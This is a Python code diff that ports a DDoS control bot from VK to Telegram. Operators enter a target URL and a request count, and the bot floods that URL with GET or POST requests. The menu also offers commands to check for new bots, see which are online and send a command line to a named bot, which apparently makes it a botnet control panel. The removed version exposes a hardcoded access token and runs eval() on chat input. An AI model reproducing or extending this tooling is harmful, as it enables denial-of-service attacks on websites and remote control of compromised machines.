@@ -1,123 +1,96 @@
-from vk_api import VkApi
-from vk_api.longpoll import VkLongPoll, VkEventType
+import telebot
+import config
+from dbworker import set_state, get_current_state
 from POSTGET import postDDoS, getDDoS
-from POSTGET import message
 
-token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce' # Community token
+client = telebot.TeleBot(config.config["token"])
 
-vk_session = VkApi(token=token) # "Run" your community
-vk = vk_session.get_api() # Begin work with API
-longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess
+link = []
+data = []
 
-requestIsEnd = False
+def mainDDoS(message):
+    if(message.text == "Exit"):
+        client.send_message(message.chat.id, 'Logged in - ')
+        client.send_message(message.chat.id, "Commands: ")
+        client.send_message(message.chat.id, 'DDOS - enter in DDoS panel')
+        client.send_message(message.chat.id, 'Check - check new bots')
+        client.send_message(message.chat.id, 'Bot name + cmd - command line')
+        client.send_message(message.chat.id, 'online - bots online')
+        set_state(message.chat.id, config.States.S_LOGINED_A)
+    elif(message.text == "GET"):
+        client.send_message(message.chat.id, 'Enter link. To exit type "Exit" ')
+        set_state(message.chat.id, config.States.S_DDOS_GET1_A)
+    elif (message.text == "POST"):
+        client.send_message(message.chat.id, 'Enter link. To exit type "Exit" ')
+        set_state(message.chat.id, config.States.S_DDOS_POST1_A)
 
-# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
-#                                                             #
-#       Here is very complicated part of code. There is       #
-#       a lot of cycles and notifications. Don't try          #
-#       to understand that. It's works and i am happy         #
-#                                                             #
-# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET1_A)
+def GETDDOS1(message):
+    if(message.text != "Exit"):
+        link.append(message.text)
+        client.send_message(message.chat.id, 'Enter count of operations. To exit type "Exit" ')
+        set_state(message.chat.id, config.States.S_DDOS_GET2_A)
+    else:
+        client.send_message(message.chat.id, 'Choose type of DDoS:')
+        client.send_message(message.chat.id, 'GET')
+        client.send_message(message.chat.id, 'POST')
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        set_state(message.chat.id, config.States.S_DDOS_A)
 
-def mainDDoS(): # Main function with notification
-    try:
-        # Shown all comands
-        message('Выберите тип DDoS:')
-        message('GET')
-        message('POST')
-        message('Для того чтобы выйти в главное меню введите "Выход"')
-        for event in longpoll.listen(): # Wait for next command
-            if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                if event.text == 'Назад': # If command is "Назад" notification and break cycle
-                    message('Выберите тип DDoS:')
-                    message('GET')
-                    message('POST')
-                    message('Для того чтобы выйти в главное меню введите "Выход"')
-                    break
-                elif event.text == 'Выход': # If command is "Выход" notification and break cycle
-                    message('Выходим...')
-                    break
-                elif event.text == 'GET': # If command is "GET" enter in GET menu
-                    message('Введите ссылку. Для того чтобы вернуться назад "Назад"') # To return - type "Назад"
-                    for event in longpoll.listen():
-                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                            if event.text == 'Назад': # If command is "Назад" notification and break cycle
-                                message('Выберите тип DDoS:')
-                                message('GET')
-                                message('POST')
-                                message('Для того чтобы выйти в главное меню введите "Выход"')
-                                break
-                            elif event.text == 'Выход': # If command is "Выход" notification and break cycle
-                                message('Выберите тип DDoS:')
-                                message('GET')
-                                message('POST')
-                                message('Для того чтобы выйти в главное меню введите "Выход"')
-                                break
-                            elif event.text != 'Назад': # If command is not "Назад" - remember last string as url
-                                url = event.text
-                                message('Введите число запросов. Для того чтобы вернуться назад "Назад"')
-                                for event in longpoll.listen(): # Wait for next command - count of repetitions
-                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                        if event.text == 'Назад': # If command is "Назад" notification and break cycle
-                                            message('Введите ссылку. Для того чтобы вернуться назад "Назад"')
-                                            break
-                                        elif event.text == 'Выход': # If command is "Выход" notification and break cycle
-                                            message('Выходим...')
-                                            break
-                                        elif event.text != 'Назад': # If command is not "Назад" - notification and begin send requests
-                                            message(url + ' - Идет DDoS...')
-                                            for i in range(int(event.text)):
-                                                getDDoS(url)
-                                            # After end of DDoS type "Выход" to return in main menu
-                                            message('DDoS закончен! Для выхода введите "Выход"')
-                                            break
-                elif event.text == 'POST': # if comand is POST - mutually exclusive with GET
-                    message('Введите ссылку. Для того чтобы вернуться назад "Назад".')
-                    for event in longpoll.listen():
-                        if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                            if event.text == 'Назад': # If command is "Назад" notification and break cycle
-                                message('Выберите тип DDoS:')
-                                message('GET')
-                                message('POST')
-                                message('Для того чтобы выйти в главное меню введите "Выход"')
-                                break
-                            elif event.text == 'Выход': # If command is "Выход" notification and break cycle
-                                message('Выберите тип DDoS:')
-                                message('GET')
-                                message('POST')
-                                message('Для того чтобы выйти в главное меню введите "Выход"')
-                                break
-                            elif event.text != 'Назад': # If command is not "Назад" - notification, reapet url and asks for a data tuple
-                                url = event.text
-                                message('Введите кортеж data. Для того чтобы вернуться назад "Назад"')
-                                for event in longpoll.listen(): # Wait for next command
-                                    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                        if event.text == 'Назад': # If command is "Назад" notification and break cycle
-                                            message('Введите ссылку. Для того чтобы вернуться назад "Назад".')
-                                            break
-                                        elif event.text == 'Выход': # If command is "Выход" notification and break cycle
-                                            message('Введите "Выход" еще раз')
-                                            break
-                                        elif event.text != 'Назад': # If command is not "Назад" - notification, reapet tuple as "data" and asks for count of repetitions
-                                            data = event.text
-                                            dict = eval(data)
-                                            message('Введите число запросов. Для того чтобы вернуться назад "Назад"')
-                                            for event in longpoll.listen(): # Wait next message
-                                                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
-                                                    if event.text == 'Назад': # If command is "Назад" notification and break cycle
-                                                        message('Введите кортеж data. Для того чтобы вернуться назад "Назад"')
-                                                        break
-                                                    elif event.text == 'Выход': # If command is "Выход" notification and break cycle
-                                                        message('Выходим...')
-                                                        break
-                                                    elif event.text != 'Назад': # If command is not "Назад" - notification and begin send requests
-                                                        print(dict)
-                                                        message(url + ' - Идет DDoS...')
-                                                        for i in range(int(event.text)):
-                                                            postDDoS(url, dict)
-                                                        # After end of DDoS type "Выход" 2 times to return in main menu
-                                                        message('DDoS закончен! Для выхода введите "Выход"')
-                                                        break
-    except:
-        message('Произошла ошибка.')
-        pass
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_GET2_A)
+def GETDDOS2(message):
+    if(message.text != "Exit"):
+        client.send_message(message.chat.id, 'DDOS is had begun')
+        operations = int(message.text)
+        for i in range(operations):
+            getDDoS(link[0])
+        client.send_message(message.chat.id, 'DDOS is end, you was redirected to main menu')
+        set_state(message.chat.id, config.States.S_LOGINED_A)
+    else:
+        client.send_message(message.chat.id, 'Choose type of DDoS:')
+        client.send_message(message.chat.id, 'GET')
+        client.send_message(message.chat.id, 'POST')
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        set_state(message.chat.id, config.States.S_DDOS_A)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST1_A)
+def POSTDDOS1(message):
+    if(message.text != "Exit"):
+        link.append(message.text)
+        client.send_message(message.chat.id, 'Enter data of POST request. To exit type "Exit" ')
+        set_state(message.chat.id, config.States.S_DDOS_POST2_A)
+    else:
+        client.send_message(message.chat.id, 'Choose type of DDoS:')
+        client.send_message(message.chat.id, 'GET')
+        client.send_message(message.chat.id, 'POST')
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        set_state(message.chat.id, config.States.S_DDOS_A)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST2_A)
+def POSTDDOS2(message):
+    if(message.text != "Exit"):
+        data.append(message.text)
+        client.send_message(message.chat.id, 'Enter count of operations. To exit type "Exit" ')
+        set_state(message.chat.id, config.States.S_DDOS_POST3_A)
+    else:
+        client.send_message(message.chat.id, 'Choose type of DDoS:')
+        client.send_message(message.chat.id, 'GET')
+        client.send_message(message.chat.id, 'POST')
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        set_state(message.chat.id, config.States.S_DDOS_A)
+
+@client.message_handler(func=lambda message: get_current_state(message.chat.id) == config.States.S_DDOS_POST3_A)
+def POSTDDOS3(message):
+    if(message.text != "Exit"):
+        client.send_message(message.chat.id, 'DDOS is had begun')
+        operations = int(message.text)
+        for i in range(operations):
+            postDDoS(link[0], data[0])
+        client.send_message(message.chat.id, 'DDOS is end, you was redirected to main menu')
+        set_state(message.chat.id, config.States.S_LOGINED_A)
+    else:
+        client.send_message(message.chat.id, 'Choose type of DDoS:')
+        client.send_message(message.chat.id, 'GET')
+        client.send_message(message.chat.id, 'POST')
+        client.send_message(message.chat.id, 'To exit type "Exit"')
+        set_state(message.chat.id, config.States.S_DDOS_A)
